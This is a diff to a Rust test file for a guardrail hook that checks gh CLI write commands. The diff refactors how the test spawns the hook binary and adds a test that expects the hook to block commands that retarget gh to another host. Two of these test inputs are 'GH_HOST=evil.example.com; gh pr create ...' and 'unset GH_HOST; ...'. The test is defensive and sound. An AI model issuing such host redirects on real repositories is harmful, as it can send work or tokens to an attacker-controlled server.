@@ -5,8 +5,10 @@
 //! Setting it inside that test binary flipped their bare-owner verdicts
 //! whenever the two overlapped. A child's environment touches nothing else.
 
+mod support;
+
 use std::io::Write;
-use std::process::{Command, Stdio};
+use std::process::Stdio;
 
 fn guard(command: &str, gh_host: &str) -> i32 {
     let scratch = tempfile::tempdir().expect("temp metrics dir");
@@ -17,7 +19,7 @@ fn guard(command: &str, gh_host: &str) -> i32 {
         "cwd": "/tmp",
     })
     .to_string();
-    let mut child = Command::new(env!("CARGO_BIN_EXE_cadence-hooks"))
+    let mut child = support::cadence_hooks()
         .args(["guardrails", "guard-gh-write"])
         // Ambient switches would exempt the guard and fake a pass.
         .env_remove("CADENCE_BYPASS")
@@ -67,4 +69,29 @@ fn process_gh_host_moves_the_default_host_and_hostname_outranks_it() {
             "--hostname outranks the process GH_HOST: {command}"
         );
     }
+}
+
+/// Once the shell inherits `GH_HOST`, the variable is already exported, so a
+/// bare assignment in an earlier segment reaches gh (#548). And `unset` then
+/// hands gh a default this guard never read, so it resolves to an unknown host.
+#[test]
+fn inherited_gh_host_makes_a_bare_assignment_reach_gh() {
+    for command in [
+        "GH_HOST=evil.example.com; gh pr create -R cameronsjo/x --title t",
+        "unset GH_HOST; gh pr create -R cameronsjo/x --title t",
+    ] {
+        assert_eq!(
+            guard(command, "git.sjo.lol"),
+            2,
+            "inherited GH_HOST is exported: {command}"
+        );
+    }
+    assert_eq!(
+        guard(
+            "GH_HOST=git.sjo.lol; gh pr create -R cameronsjo/x --title t",
+            "git.sjo.lol"
+        ),
+        0,
+        "re-assigning the inherited host changes nothing"
+    );
 }
